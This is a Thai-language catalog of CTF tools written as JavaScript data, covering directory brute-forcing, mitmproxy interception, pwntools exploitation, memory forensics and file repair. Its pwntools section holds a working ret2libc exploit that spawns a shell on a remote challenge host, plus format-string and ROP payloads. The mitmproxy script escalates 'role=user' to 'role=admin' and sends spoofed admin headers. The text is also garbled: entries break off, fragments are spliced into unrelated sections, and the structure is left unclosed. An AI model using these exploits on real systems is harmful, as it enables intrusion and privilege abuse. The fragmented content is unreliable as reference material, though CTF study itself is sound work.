about:'Feroxbuster เขียนด้วย Rust เร็วมากและ recursive ในตัว หมายความว่าถ้าเจอ directory ใหม่จะ scan เข้าไปต่อเองอัตโนมัติโดยไม่ต้อง run ซ้ำ ต่างจาก gobuster/dirb ที่ต้อง recursive ด้วยตัวเอง รองรับ wildcard detection (กรอง false positives อัตโนมัติ), filter ตาม status code, response size, word count เหมาะมากสำหรับ CTF web ที่ต้องการหา hidden endpoints และไฟล์ที่น่าสนใจ',
install:`# Kali (แนะนำ):
sudo apt install feroxbuster

# Manual install:
curl -sL https://raw.githubusercontent.com/epi052/feroxbuster/main/install-nix.sh | bash

# Go:
go install github.com/epi052/feroxbuster@latest`,
usage:[{label:'พื้นฐาน — scan directory',body:`# ใช้ wordlist มาตรฐาน:
feroxbuster -u http://target.com -w /usr/share/wordlists/dirb/common.txt

# scan พร้อม extensions:
feroxbuster -u http://target.com -w /usr/share/wordlists/dirb/big.txt -x php,html,txt,js,bak

# ใช้ wordlist ใหญ่จาก SecLists:
feroxbuster -u http://target.com -w /usr/share/seclists/Discovery/Web-Content/raft-large-words.txt`},
{label:'Control depth + threads',body:`# recursive depth 3 ชั้น (default: 4):
feroxbuster -u http://target.com -d 3 -t 50

# ไม่ recursive (เร็วกว่า ถ้าต้องการแค่ root level):
feroxbuster -u http://target.com --no-recursion

# เพิ่ม threads (default: 50):
feroxbuster -u http://target.com -t 100`},
{label:'Filter noise ออก',body:`# กรอง 404 และ 403:
feroxbuster -u http://target.com -C 404,403

# กรอง response ที่มี size เท่ากัน (น่าจะเป็น default page):
feroxbuster -u http://target.com -S 1234

# กรองด้วยจำนวน words:
feroxbuster -u http://target.com -W 50`},
{label:'ใส่ Headers + Cookie',body:`# ใส่ Authorization header:
feroxbuster -u http://target.com -H "Authorization: Bearer TOKEN"

# ใส่ Cookie (หลัง login แล้ว):
feroxbuster -u http://target.com -H "Cookie: session=abc123"

# ใส่หลาย header:
feroxbuster -u http://target.com -H "X-Forwarded-For: 127.0.0.1" -H "Cookie: admin=1"`},
{label:'Save และ Resume',body:`# save output:
feroxbuster -u http://target.com -o results.txt

# save state เพื่อ resume ทีหลัง:
feroxbuster -u http://target.com --resume-from state.json`}],
checklist:['1. feroxbuster -u target -w common.txt -x php,html,txt,bak','2. ดู 200 responses ที่ size ต่างจากปกติ','3. เข้า path ที่เจอด้วยมือ'],
tips:['ใน CTF ลอง -x php,html,txt,bak,zip,sql,log,conf เสมอ — บ่อยครั้งมีไฟล์ backup ให้หา','ถ้าเจอ 200 ที่ขนาดต่างจากปกติ ต้องดูด้วยตา','--smart-mode ช่วย detect + กรอง wildcard responses อัตโนมัติ','ลอง /usr/share/seclists/Discovery/Web-Content/common.txt ถ้า dirb/common.txt ไม่ครบ'],
},

{cat:'web',name:'httpx',url:'https://github.com/projectdiscovery/httpx',tags:['cli'],

{label:'Filter ตาม status code',body:`# เฉพาะ 200 OK:

{cat:'web',name:'mitmproxy',url:'https://mitmproxy.org/',tags:['python','cli'],
desc:'Interactive HTTPS proxy — intercept, modify, replay, script HTTP/S traffic',
about:'mitmproxy เป็น open-source proxy ที่รองรับ HTTPS interception แบบ man-in-the-middle มี 3 modes: mitmproxy (TUI interactive), mitmweb (browser-based UI), mitmdump (command-line/scripting) จุดแข็งที่เหนือกว่า Burp Suite คือ Python scripting — เขียน script เพื่อ automate modify requests/responses ได้ทุกอย่าง เหมาะสำหรับ CTF ที่ต้องการ intercept traffic ของ app หรือ automation',
install:`pip3 install mitmproxy
# ตรวจสอบ:
mitmproxy --version`,
usage:[{label:'เริ่มต้น intercept',body:`# TUI mode (interactive keyboard):
mitmproxy -p 8080

# Web UI mode (เปิด browser ดู):
mitmweb -p 8080
# → เปิด http://127.0.0.1:8081 ใน browser

# Dump mode (log ทุก request):
mitmdump -p 8080`},
{label:'ตั้ง proxy บน browser/curl',body:`# curl ผ่าน mitmproxy:
curl -x http://127.0.0.1:8080 http://target.com

# install cert (สำหรับ HTTPS):
# เปิด http://mitm.it ในขณะที่ proxy กำลังรัน
# แล้ว download cert สำหรับ OS ของตัวเอง

# Python requests ผ่าน proxy:
import requests
proxies = {"http": "http://127.0.0.1:8080", "https": "http://127.0.0.1:8080"}
r = requests.get("https://target.com", proxies=proxies, verify=False)`},
{label:'Python script — modify requests',body:`# save เป็น script.py แล้ว: mitmdump -s script.py -p 8080

from mitmproxy import http

def request(flow: http.HTTPFlow) -> None:
    # เปลี่ยน header ทุก request:
    flow.request.headers["X-Forwarded-For"] = "127.0.0.1"
    
    # เปลี่ยน body POST:
    if flow.request.method == "POST":
        flow.request.text = flow.request.text.replace("role=user", "role=admin")

def response(flow: http.HTTPFlow) -> None:
    # log response body:
    print(flow.response.text[:200])`},
{label:'บันทึกและ replay traffic',body:`# บันทึก traffic ลงไฟล์:
mitmdump -p 8080 -w traffic.mitm

# replay ไฟล์ที่บันทึกไว้:
mitmproxy -r traffic.mitm

# replay ไปยัง server อื่น:
mitmdump -r traffic.mitm --mode upstream:http://server2.com`}],
checklist:['1. mitmweb -p 8080 → เปิด browser ผ่าน proxy','2. intercept + modify request','3. script ด้วย Python สำหรับ automation'],
tips:['mitmweb ใช้งานง่ายกว่า Burp สำหรับ quick inspection','ใน CTF บางข้อมี mobile app หรือ script ที่ต้อง intercept — mitmproxy ตอบโจทย์','ถ้า HTTPS ใช้ไม่ได้ ตรวจว่า install cert แล้วหรือยัง ที่ http://mitm.it'],
},

{cat:'pwn',name:'pwntools',url:'https://docs.pwntools.com/',tags:['python','cli'],
desc:'Python library มาตรฐาน CTF pwn — process, ROP, shellcraft, ELF',
about:'pwntools เป็น library ที่ทุกคนที่ทำ pwn CTF ต้องรู้จัก รองรับ remote/local connection, ELF parsing, ROP chain building, shellcode generation, format string ทุกอย่างที่ต้องการ',
install:'pip3 install pwntools',
usage:[{label:'Template พื้นฐาน',body:`from pwn import *
context.arch = 'amd64'  # หรือ 'i386'
context.log_level = 'debug'

# Local / Remote
p = process('./vuln')
p = remote('chall.ctf.com', 9001)

elf = ELF('./vuln')
libc = ELF('libc.so.6')

# Send / Receive
p.sendline(b'A' * 64)
p.send(b'payload')
resp = p.recvuntil(b'> ')
resp = p.recvline()

p.interactive()  # drop to shell`},
{label:'ROP chain',body:`rop = ROP(elf)
rop.raw(rop.ret)           # stack alignment (16-byte)
rop.call(elf.plt['puts'], [elf.got['puts']])
rop.call(elf.symbols['main'])

payload = flat({
    offset: rop.chain()
})
p.sendline(payload)`},
{label:'Format string attack',body:`# Leak stack value ที่ offset 6
p.sendline(b"%6$p")
leak = int(p.recvline().strip(), 16)

# Leak canary (offset ต้องหาก่อน)
payload = b"%15$p"  # ลอง offset ต่างๆ

# Write to address (%n)
payload = fmtstr_payload(offset, {target_addr: value})`},
{label:'ret2libc (ASLR bypass)',body:`# Step 1: leak libc base

p.interactive()`}],

desc:'หา libc version จาก leaked function address',

# 2. Leak puts GOT address:

p.sendline(payload)

# 3. ใส่ค่าใน libc.blukat.me หรือ:

# 4. คำนวณ base และ addresses:

# Step 1: leak puts address
p = remote('chall.ctf.com', 9001)
p.sendline(b'A'*offset + p64(pop_rdi) + p64(elf.got['puts']) + p64(elf.plt['puts']) + p64(main))
leak = u64(p.recvuntil(b'\n')[:6].ljust(8, b'\x00'))
print(hex(leak))  # e.g. 0x7f1234567890

# Step 2: ค้น libc.blukat.me ด้วย puts=0x890
# → libc-2.31.so, puts offset = 0x84420

# Step 3: calc base + exploit
libc_base = leak - 0x84420
system = libc_base + 0x55410
binsh  = libc_base + 0x1b75aa
p.sendline(b'A'*offset + p64(pop_rdi) + p64(binsh) + p64(ret) + p64(system))
p.interactive()`}],

install:`# วิธีเร็วด้วย pip / pipx

cd volatility3
python3 -m pip install -r requirements.txt
python3 vol.py -h

# ตรวจว่า plugin ชื่ออะไรบ้างในเครื่องเรา
vol -h
vol windows.pslist --help
vol windows.dumpfiles --help

# หมายเหตุ: คำสั่งสั้นแบบ windows.pslist ใช้ได้
# ถ้า error ให้ลองชื่อเต็มจาก help เช่น windows.pslist.PsList`,
usage:[{label:'Setup + sanity check',body:`# ตั้งชื่อตัวแปรไฟล์ memory เพื่อพิมพ์สั้นลง
MEM=memory.raw

# ดู help หลักและ plugin ทั้งหมด

vol windows.pslist --help
vol windows.dumpfiles --help

# วิเคราะห์ Windows dump ขั้นแรก
vol -f $MEM windows.info
vol -f $MEM windows.statistics

# ถ้าเป็น Linux/macOS หรือยังไม่รู้ OS

# export ผลลัพธ์เป็น format ที่ grep/jq/csvkit ใช้ง่าย

{label:'Quick flag hunting workflow',body:`# 1) หา flag ตรงๆ จากทั้ง image ก่อน เสียเวลาไม่มาก

strings -a -el $MEM | grep -aoiE "picoCTF\\{[^}]+\\}|flag\\{[^}]+\\}|ctf\\{[^}]+\\}" | sort -u

# 2) หา keyword รอบๆ flag/password/secret
strings -a $MEM | grep -aiE "flag|ctf|pico|secret|password|passwd|token|key|admin" | head -200
strings -a -el $MEM | grep -aiE "flag|ctf|pico|secret|password|passwd|token|key|admin" | head -200

# 3) ระบุ OS แล้วดู process
vol -f $MEM windows.info
vol -f $MEM windows.pslist

vol -f $MEM windows.cmdline

# 4) เจอ process น่าสงสัยแล้ว dump process memory

strings -a out/*.dmp | grep -aiE "flag|ctf|pico|secret|password" | head -100
strings -a -el out/*.dmp | grep -aiE "flag|ctf|pico|secret|password" | head -100

# 5) หาไฟล์ที่เคยถูกเปิด/ถูก cache แล้ว dump

vol -f $MEM -o out windows.dumpfiles --filter ".*flag.*" --ignore-case
vol -f $MEM -o out windows.dumpfiles --filter ".*\\.(txt|docx|pdf|png|jpg|zip)$" --ignore-case`},

{label:'Windows: files + dumping',body:`# หา file object จาก memory

{label:'Image magic + complete structure',body:`# JPEG / JPG
Header: FF D8 FF E0 xx xx 4A 46 49 46 00    = SOI + JFIF
Header: FF D8 FF E1 xx xx 45 78 69 66 00    = SOI + EXIF
Footer: FF D9
Complete: SOI -> APP0/APP1 -> DQT -> SOF0/SOF2(width,height) -> DHT -> SOS -> entropy data -> EOI

# PNG
Header: 89 50 4E 47 0D 0A 1A 0A
Chunks: IHDR -> optional chunks -> IDAT... -> IEND
IEND:   00 00 00 00 49 45 4E 44 AE 42 60 82
Width/height: bytes 16-23, big-endian, inside IHDR data

# GIF
Header: 47 49 46 38 37 61  = GIF87a
Header: 47 49 46 38 39 61  = GIF89a
Trailer: 3B
Width/height: bytes 6-9, little-endian

# BMP
Header: 42 4D = BM
Complete: BITMAPFILEHEADER(14) -> DIB header -> color table optional -> pixels
File size: bytes 2-5 little-endian
Pixel offset: bytes 10-13 little-endian
Width/height: bytes 18-25 little-endian for common BITMAPINFOHEADER

# TIFF
Header: 49 49 2A 00 = little-endian TIFF
Header: 4D 4D 00 2A = big-endian TIFF

# WebP
Header: 52 49 46 46 ?? ?? ?? ?? 57 45 42 50 = RIFF....WEBP
Chunks: VP8 / VP8L / VP8X`},
{label:'Archive / document / executable magic',body:`# ZIP / DOCX / XLSX / PPTX / APK / JAR
Header: 50 4B 03 04 = PK..
Central dir: 50 4B 01 02
End: 50 4B 05 06
Note: Office modern files are ZIP containers. Rename .docx -> .zip and unzip.

# PDF
Header: 25 50 44 46 2D = %PDF-
Footer: 25 25 45 4F 46 = %%EOF
Complete: %PDF-version -> objects -> xref -> trailer -> startxref -> %%EOF

# RAR / 7z / gzip / bzip2 / xz / tar
RAR4: 52 61 72 21 1A 07 00
RAR5: 52 61 72 21 1A 07 01 00
7z:   37 7A BC AF 27 1C
gzip: 1F 8B
bzip2: 42 5A 68
xz:   FD 37 7A 58 5A 00
tar:  "ustar" at offset 257, not always at byte 0

# SQLite / PCAP / PCAPNG / EVTX
SQLite: "SQLite format 3" then 00
PCAP little: D4 C3 B2 A1
PCAP big:    A1 B2 C3 D4
PCAPNG:      0A 0D 0D 0A
EVTX:        45 6C 66 46 69 6C 65 00 = ElfFile.

# Executables
ELF: 7F 45 4C 46
PE:  4D 5A at offset 0, then PE 00 00 at e_lfanew offset
Mach-O: FE ED FA CE / FE ED FA CF / CA FE BA BE
Java class: CA FE BA BE`},
{label:'Audio / video / container magic',body:`# MP3
ID3 tag: 49 44 33 = ID3
Frame sync: FF FB / FF F3 / FF F2 / FF FA
Complete: optional ID3v2 -> MPEG audio frames -> optional ID3v1 TAG at last 128 bytes

# WAV / AVI are RIFF containers
WAV: 52 49 46 46 size 57 41 56 45 = RIFF....WAVE
AVI: 52 49 46 46 size 41 56 49 20 = RIFF....AVI
RIFF size: bytes 4-7 little-endian, normally file_size - 8

# FLAC / OGG
FLAC: 66 4C 61 43 = fLaC
OGG:  4F 67 67 53 = OggS

# MP4 / MOV / M4A / 3GP
Usually begins with box size + "ftyp":
00 00 00 18 66 74 79 70 69 73 6F 6D = ....ftypisom
Boxes: ftyp -> moov(metadata/index) -> mdat(media data)
Some files: ftyp -> mdat -> moov at end

# MKV / WebM
Header: 1A 45 DF A3 = EBML
Contains Matroska/WebM elements

# MPEG TS
Sync byte: 47 every 188 bytes
Check: bytes 0,188,376 should often be 47`},
{label:'Spot fake extension / embedded files',body:`# extension says jpg but header says PK = probably ZIP/docx/apk/jar
file challenge.jpg
xxd -g 1 -l 16 challenge.jpg
binwalk challenge.jpg

# หา magic bytes ที่ offset อื่น แปลว่ามีไฟล์ซ่อนหรือ junk นำหน้า
binwalk -R "\\x89PNG\\r\\n\\x1a\\n" blob.bin
binwalk -R "\\xff\\xd8\\xff" blob.bin
binwalk -R "PK\\x03\\x04" blob.bin

# carve ตาม offset ที่ binwalk เจอ
binwalk blob.bin
dd if=blob.bin of=carved.png bs=1 skip=12345 status=none
file carved.png

# ถ้า header เสียแต่ body ยังมี signature ย่อย
grep -abo "JFIF" broken.bin
grep -abo "Exif" broken.bin
grep -abo "IHDR" broken.bin
grep -abo "IEND" broken.bin
grep -abo "ftyp" broken.bin
grep -abo "moov" broken.bin
grep -abo "mdat" broken.bin

# ตรวจ footer/trailer
tail -c 32 file.jpg | xxd -g 1
tail -c 32 file.png | xxd -g 1
tail -c 128 file.zip | xxd -g 1`},
{label:'Make reference files for header compare',body:`# สร้างไฟล์ดีๆ ขนาดเล็กไว้เทียบ header

magick -size 1x1 xc:red refs/one.png
magick -size 1x1 xc:red refs/one.jpg
magick -size 1x1 xc:red refs/one.bmp
magick -size 1x1 xc:red refs/one.gif
printf "hello\\n" > refs/hello.txt
zip refs/hello.zip refs/hello.txt
python3 - <<'PY'

Path("refs/min.pdf").write_bytes(b"%PDF-1.1\\n1 0 obj<<>>endobj\\ntrailer<<>>\\n%%EOF\\n")
PY

# เทียบ header แบบ side-by-side

xxd -g 1 -l 128 broken.png
cmp -l refs/one.png broken.png | head -50
binwalk -W refs/one.png broken.png`}],

{cat:'forensics',name:'Corrupt File Repair Cookbook',url:'https://www.cgsecurity.org/wiki/PhotoRec',tags:['cli','python'],
desc:'ซ่อมไฟล์เสีย common CTF: JPG, PNG, BMP, GIF, PDF, ZIP/Office, WAV, MP3, PCAP, SQLite, executable',
about:'เป้าหมายคือทำให้ parser อ่านไฟล์ได้พอที่จะดึง flag ไม่จำเป็นต้อง restore 100% แบบ forensic lab แนวทางคือ identify → carve → patch header/trailer/size/CRC → remux/rebuild → extract flag ถ้าข้อมูลสำคัญหายจริงให้กู้ partial output แทน เช่น strings, binwalk, foremost, photorec',
usage:[{label:'Safe repair workflow + byte patching',body:`# ทำงานบนสำเนาเท่านั้น
cp broken.bin work.bin
mkdir -p repair_out

# ดู header/tail ก่อนแก้
file work.bin
xxd -g 1 -l 128 work.bin
tail -c 128 work.bin | xxd -g 1
binwalk work.bin

# patch bytes ด้วย printf + dd
# ตัวอย่าง: เขียน PNG signature ที่ offset 0
printf '\\x89PNG\\r\\n\\x1a\\n' | dd of=work.bin bs=1 seek=0 conv=notrunc status=none

# patch จาก hex string
echo "FFD8FFE000104A46494600" | xxd -r -p | dd of=work.jpg bs=1 seek=0 conv=notrunc status=none

# ตัด junk ก่อน magic offset
dd if=broken.bin of=carved.bin bs=1 skip=1234 status=none

# ตัดหลัง offset สุดท้าย เช่นเจอ footer จบที่ byte 54321
head -c 54321 broken.bin > trimmed.bin

# เปรียบเทียบกับ reference
cmp -l refs/good.png work.bin | head -50
vbindiff refs/good.png work.bin`},
{label:'JPG / JPEG repair',body:`# ตรวจ
file broken.jpg
exiftool broken.jpg
jpeginfo -c broken.jpg
xxd -g 1 -l 64 broken.jpg
tail -c 32 broken.jpg | xxd -g 1

# 1) header หาย: ใส่ SOI + JFIF แบบพื้นฐาน ถ้า body เริ่มใกล้ JFIF/Exif
cp broken.jpg fixed.jpg
printf '\\xff\\xd8\\xff\\xe0\\x00\\x10JFIF\\x00\\x01\\x01\\x00\\x00\\x01\\x00\\x01\\x00\\x00' \
  | dd of=fixed.jpg bs=1 seek=0 conv=notrunc status=none

# 2) junk นำหน้า: หา SOI แล้ว carve
grep -abo "$(printf '\\xff\\xd8\\xff')" broken.bin
dd if=broken.bin of=carved.jpg bs=1 skip=OFFSET status=none

# 3) footer หาย: เติม EOI
cp broken.jpg fixed_eoi.jpg
printf '\\xff\\xd9' >> fixed_eoi.jpg

# 4) มีไฟล์ซ่อนหลัง EOI: ตัดถึง FF D9 สุดท้าย หรือใช้ binwalk
binwalk broken.jpg
foremost -i broken.jpg -o repair_out/foremost_jpg

# 5) rebuild JPEG structure ถ้าเปิดได้บ้าง
jpegtran -copy all -optimize broken.jpg > rebuilt.jpg
magick broken.jpg rebuilt.png
exiftool -b -PreviewImage broken.jpg > preview.jpg

# จุดสังเกต: JPG ไม่มี width/height ที่ offset คงที่ ต้องหา SOF0/SOF2 marker FF C0 หรือ FF C2
# ใน SOF marker: precision 1 byte, height 2 bytes big-endian, width 2 bytes big-endian`},
{label:'PNG repair',body:`# ตรวจละเอียด
file broken.png
pngcheck -v broken.png
exiftool broken.png
xxd -g 1 -l 64 broken.png
tail -c 32 broken.png | xxd -g 1

# 1) signature เสีย
cp broken.png fixed.png
printf '\\x89PNG\\r\\n\\x1a\\n' | dd of=fixed.png bs=1 seek=0 conv=notrunc status=none

# 2) junk นำหน้า: carve จาก PNG signature
grep -abo "$(printf '\\x89PNG\\r\\n\\x1a\\n')" broken.bin
dd if=broken.bin of=carved.png bs=1 skip=OFFSET status=none

# 3) IEND หาย: เติม chunk IEND มาตรฐาน
cp broken.png fixed_iend.png
printf '\\x00\\x00\\x00\\x00IEND\\xaeB\\x60\\x82' >> fixed_iend.png

# 4) CRC/chunk เสีย: ให้ pngfix/libpng ช่วย rebuild เท่าที่ทำได้
pngfix --out=fixed_pngfix.png broken.png
pngcheck -v fixed_pngfix.png

# 5) ซ่อม CRC ของทุก chunk ด้วย Python เมื่อ chunk data ยังอยู่
python3 - <<'PY'
import struct, zlib
from pathlib import Path
p=Path("broken.png")
b=bytearray(p.read_bytes())
b[:8]=b"\\x89PNG\\r\\n\\x1a\\n"
i=8
while i+12 <= len(b):
    ln=struct.unpack(">I", b[i:i+4])[0]
    typ=b[i+4:i+8]
    end=i+8+ln
    if end+4 > len(b): break
    crc=zlib.crc32(typ + b[i+8:end]) & 0xffffffff
    b[end:end+4]=struct.pack(">I", crc)
    i=end+4
    if typ == b"IEND": break
Path("fixed_crc.png").write_bytes(b)
PY

# 6) width/height ผิด: PNG width/height อยู่ bytes 16-23 big-endian แล้วต้อง update CRC ของ IHDR
python3 - <<'PY'
import struct, zlib
from pathlib import Path
w,h=800,600
b=bytearray(Path("broken.png").read_bytes())
b[:8]=b"\\x89PNG\\r\\n\\x1a\\n"
b[16:24]=struct.pack(">II", w, h)
crc=zlib.crc32(b"IHDR" + b[16:29]) & 0xffffffff
b[29:33]=struct.pack(">I", crc)
Path("fixed_size.png").write_bytes(b)
PY`},
{label:'BMP / GIF / TIFF / WebP repair',body:`# BMP
file broken.bmp
xxd -g 1 -l 64 broken.bmp
# Header BM at 0, file size at 2-5, pixel offset at 10-13, width/height at 18-25
python3 - <<'PY'
import struct
from pathlib import Path
b=bytearray(Path("broken.bmp").read_bytes())
b[0:2]=b"BM"
b[2:6]=struct.pack("<I", len(b))
# common 24-bit BMP pixel offset is often 54; only force if obviously broken
if int.from_bytes(b[10:14],"little") == 0:
    b[10:14]=struct.pack("<I", 54)
Path("fixed.bmp").write_bytes(b)
PY

# GIF
# Header GIF87a/GIF89a, width/height bytes 6-9 little-endian, trailer 3B
cp broken.gif fixed.gif
printf 'GIF89a' | dd of=fixed.gif bs=1 seek=0 conv=notrunc status=none
tail -c 1 fixed.gif | xxd
printf '\\x3b' >> fixed.gif

# TIFF
# II*00 หรือ MM00* ต้องตรง endian; ใช้ exiftool/tiffinfo เช็ค
exiftool broken.tif
tiffinfo broken.tif
tiffcp broken.tif fixed.tif

# WebP
# WebP เป็น RIFF....WEBP; remux/re-encode ด้วย ImageMagick ถ้า decode ได้บางส่วน
file broken.webp
xxd -g 1 -l 32 broken.webp
magick broken.webp fixed.png
cwebp fixed.png -o fixed.webp`},
{label:'PDF repair',body:`# ตรวจ
file broken.pdf
pdfinfo broken.pdf
qpdf --check broken.pdf
mutool info broken.pdf
strings -a broken.pdf | head
tail -c 256 broken.pdf

# 1) header หาย
cp broken.pdf fixed.pdf
printf '%PDF-1.4\\n' | cat - broken.pdf > fixed_header.pdf

# 2) EOF หาย
cp broken.pdf fixed_eof.pdf
printf '\\n%%EOF\\n' >> fixed_eof.pdf

# 3) rebuild xref/trailer
qpdf --repair broken.pdf fixed_qpdf.pdf
mutool clean -d broken.pdf fixed_mutool.pdf
gs -o fixed_gs.pdf -sDEVICE=pdfwrite -dPDFSTOPONERROR=false broken.pdf

# 4) extract objects/streams ถึงเปิดไม่ได้
pdfimages -all broken.pdf repair_out/pdf_img
binwalk -e broken.pdf
strings -a broken.pdf | grep -aiE "flag|ctf|pico|password|secret"`},
{label:'ZIP / Office / APK / JAR repair',body:`# ตรวจ
file broken.zip
xxd -g 1 -l 32 broken.zip
zipinfo broken.zip
unzip -t broken.zip
7z t broken.zip

# 1) header PK หาย/extension หลอก
cp broken.bin fixed.zip
printf 'PK\\x03\\x04' | dd of=fixed.zip bs=1 seek=0 conv=notrunc status=none

# 2) central directory เสีย: try fix
zip -F broken.zip --out fixed_F.zip
zip -FF broken.zip --out fixed_FF.zip
7z x broken.zip -orepair_out/zip_7z
bsdtar -xf broken.zip -C repair_out/zip_tar

# 3) Office files are ZIP
cp broken.docx broken.zip
unzip -l broken.zip
unzip broken.zip -d docx_out
grep -RaiE "flag|ctf|pico|password|secret" docx_out

# 4) ถ้า ZIP ฝังท้าย JPG/PNG
binwalk image.jpg
binwalk -e image.jpg
foremost -i image.jpg -o repair_out/carved_zip`},
{label:'Audio repair: MP3 / WAV / FLAC / OGG',body:`# MP3
file broken.mp3
ffprobe broken.mp3
mp3val broken.mp3 -f -nb
id3v2 -l broken.mp3

# remove broken ID3 tag and rebuild stream
cp broken.mp3 work.mp3
id3v2 -D work.mp3
ffmpeg -err_detect ignore_err -i work.mp3 -c:a copy fixed.mp3
ffmpeg -i work.mp3 -vn -ar 44100 -ac 2 fixed_reencode.mp3

# ถ้า header หายแต่ frames ยังอยู่ หา frame sync FF FB/F3/F2
grep -abo "$(printf '\\xff\\xfb')" broken.bin
dd if=broken.bin of=carved.mp3 bs=1 skip=OFFSET status=none

# WAV
file broken.wav
ffprobe broken.wav
soxi broken.wav
# RIFF size bytes 4-7 = file_size - 8, data chunk size ต้องตรงกับ data จริง
ffmpeg -f s16le -ar 44100 -ac 2 -i raw_audio.bin fixed.wav
ffmpeg -err_detect ignore_err -i broken.wav fixed.wav

# FLAC/OGG
flac -t broken.flac
ffmpeg -err_detect ignore_err -i broken.ogg -c:a copy fixed.ogg
ffmpeg -i broken.flac fixed.wav`},
{label:'PCAP / SQLite / executable repair',body:`# PCAP / PCAPNG
file broken.pcap
capinfos broken.pcap
tshark -r broken.pcap -q
editcap -F pcap broken.pcap fixed.pcap
editcap -F pcapng broken.pcap fixed.pcapng
pcapfix broken.pcap -o fixed.pcap
strings -a broken.pcap | grep -aiE "flag|ctf|pico|password|secret"

# SQLite
file broken.db
sqlite3 broken.db "PRAGMA integrity_check;"
sqlite3 broken.db ".tables"
sqlite3 broken.db ".recover" > recovered.sql
sqlite3 fixed.db < recovered.sql
strings -a broken.db | grep -aiE "flag|ctf|pico|password|secret"

# ELF / PE
file broken
readelf -h broken
objdump -f broken
strings -a broken | grep -aiE "flag|ctf|pico|password|secret"
# PE starts MZ, e_lfanew points to PE\\0\\0; if only extension wrong just rename/run tools
pefile broken.exe
exiftool broken.exe`}],
tips:['ซ่อมเพื่อดึง flag ไม่จำเป็นต้องได้ไฟล์สวย 100%','ถ้า decoder อ่านได้บางส่วน ให้ extract/re-encode ทันทีเพื่อรักษาข้อมูลที่ยังอ่านได้','JPG เติม FF D9 ได้บ่อย แต่ถ้า entropy data กลางไฟล์หาย รูปจะเสียต่อจากจุดนั้น','PNG ต้องสนใจ CRC ของ chunk โดยเฉพาะ IHDR หลังแก้ width/height','ZIP เสียที่ central directory ยังมีโอกาสกู้ด้วย zip -FF หรือ 7z','PDF เสียที่ xref มักกู้ได้ด้วย qpdf --repair หรือ mutool clean','MP4 ถ้า moov atom หายจริงต้องใช้ reference จากกล้อง/codec เดียวกันหรือกู้ได้แค่ raw streams','ถ้า file บอก data ให้เริ่มจาก binwalk/foremost/scalpel ก่อนแก้เอง'],

{cat:'forensics',name:'Image Size & Media Container Repair',url:'https://ffmpeg.org/ffmpeg.html',tags:['cli','python'],
desc:'ปรับ/ซ่อมขนาดรูป, แก้ width/height ใน header, ซ่อม MP4/MOV/AVI/MKV shell/container',
about:'ไฟล์ภาพและวิดีโอเสียใน CTF มักไม่ใช่แค่ header แรก แต่เป็น metadata ภายใน เช่น width/height ถูกแก้, CRC ไม่ตรง, RIFF size ผิด, MP4 moov atom หายหรืออยู่ผิดที่, index เสีย, หรือ extension หลอก การซ่อมต้องแยกให้ออกระหว่าง "แก้ metadata ให้ parser เห็นข้อมูลเดิม" กับ "resize/re-encode สร้างไฟล์ใหม่"',
usage:[{label:'Image dimension offsets',body:`# ใช้ identify/exiftool ดูขนาดก่อน
identify -verbose broken.png
exiftool -ImageWidth -ImageHeight broken.*
file broken.*

# PNG
Signature 0-7
IHDR length 8-11 = 00 00 00 0D
IHDR type   12-15 = 49 48 44 52
Width       16-19 big-endian
Height      20-23 big-endian
IHDR CRC    29-32 ต้อง update หลังแก้ width/height

# GIF
Header      0-5 GIF87a/GIF89a
Width       6-7 little-endian
Height      8-9 little-endian

# BMP common BITMAPINFOHEADER
Magic       0-1 BM
File size   2-5 little-endian
Pixel start 10-13 little-endian
DIB size    14-17 often 28 00 00 00
Width       18-21 little-endian
Height      22-25 little-endian

# JPEG
Width/height not fixed offset.
Find SOF marker FF C0 / FF C2 / FF C1.
After marker: length(2), precision(1), height(2 big), width(2 big).

# WebP
RIFF....WEBP, dimensions depend on VP8 / VP8L / VP8X chunk. Use webpmux/webpinfo.`},
{label:'Patch image width / height examples',body:`# PNG: set width=800 height=600 and fix IHDR CRC
python3 - <<'PY'
import struct, zlib
from pathlib import Path
w,h=800,600
b=bytearray(Path("broken.png").read_bytes())
b[:8]=b"\\x89PNG\\r\\n\\x1a\\n"
b[16:24]=struct.pack(">II", w, h)
crc=zlib.crc32(b"IHDR" + b[16:29]) & 0xffffffff
b[29:33]=struct.pack(">I", crc)
Path("fixed_800x600.png").write_bytes(b)
PY

# GIF: set width=320 height=240
python3 - <<'PY'
import struct
from pathlib import Path
b=bytearray(Path("broken.gif").read_bytes())
b[0:6]=b"GIF89a"
b[6:10]=struct.pack("<HH", 320, 240)
Path("fixed_320x240.gif").write_bytes(b)
PY

# BMP: set width=320 height=240 and file size
python3 - <<'PY'
import struct
from pathlib import Path
b=bytearray(Path("broken.bmp").read_bytes())
b[0:2]=b"BM"
b[2:6]=struct.pack("<I", len(b))
b[18:26]=struct.pack("<ii", 320, 240)
Path("fixed_320x240.bmp").write_bytes(b)
PY

# JPEG: safer to use tool/re-encode if it decodes
magick broken.jpg fixed.png
jpegtran -copy all -optimize broken.jpg > fixed.jpg`},
{label:'Resize / rebuild images safely',body:`# Resize creates a new valid file; it does not restore missing bytes
magick broken.png -resize 800x600 fixed_resized.png
magick broken.jpg -auto-orient -resize 1024x1024\\> fixed_resized.jpg
ffmpeg -i broken.png -vf scale=800:600 fixed_ffmpeg.png

# Re-encode damaged-but-readable image
magick broken.png fixed_rebuilt.png
magick broken.jpg -strip fixed_rebuilt.jpg
ffmpeg -err_detect ignore_err -i broken.jpg fixed_from_ffmpeg.png

# Extract raw RGB if dimensions known
ffmpeg -f rawvideo -pix_fmt rgb24 -s 800x600 -i raw_pixels.bin fixed.png
magick -size 800x600 -depth 8 rgb:raw_pixels.bin fixed.png

# Try many dimensions when raw image width is unknown
for w in 256 320 400 512 640 800 1024; do
  magick -size \${w}x -depth 8 gray:raw.bin guess_\${w}.png 2>/dev/null || true
done`},
{label:'MP4 / MOV anatomy and diagnosis',body:`# MP4/MOV/M4A is a box/atom container
# Common boxes:
ftyp = file type / brands
moov = metadata + index + codec/sample tables
mdat = actual media payload
free/wide = padding

# ดูโครงสร้าง
file broken.mp4
ffprobe -hide_banner broken.mp4
mp4dump broken.mp4 | head -80
AtomicParsley broken.mp4 -T
grep -abo "ftyp" broken.mp4
grep -abo "moov" broken.mp4
grep -abo "mdat" broken.mp4

# อาการที่พบบ่อย
# "moov atom not found" = metadata/index หายหรือถูกตัด
# "Invalid data found" = header/box size เสียหรือ extension ไม่ใช่ mp4
# video มีภาพแต่ seek ไม่ได้ = index เสีย
# ftyp ไม่มี แต่ mdat ยังอยู่ = raw payload อาจกู้ด้วย reference/untrunc/recover_mp4

